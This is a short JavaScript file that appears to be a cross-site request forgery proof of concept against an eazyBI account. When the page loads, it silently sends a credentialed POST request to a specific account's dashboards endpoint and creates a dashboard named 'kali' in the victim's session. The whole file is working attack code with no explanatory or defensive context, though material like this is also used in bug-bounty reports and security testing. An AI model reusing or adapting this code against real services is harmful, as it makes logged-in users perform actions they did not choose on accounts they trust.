function lapx() {

	// body...
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST","https://aod.eazybi.com/eazy/accounts/243226/dashboards", true);
	xhttp.setRequestHeader("Content-type","application/json");
	xhttp.withCredentials = true;

	var data = JSON.stringify({
		body :{
			"name":"kali",
			"position":0,
			"definition":{
				"pages":[
				],
				"reports":[
				],
				"pages_options":{

				}
			}

		}
	}





		);






	xhttp.send(data);
}

window.onload = lapx;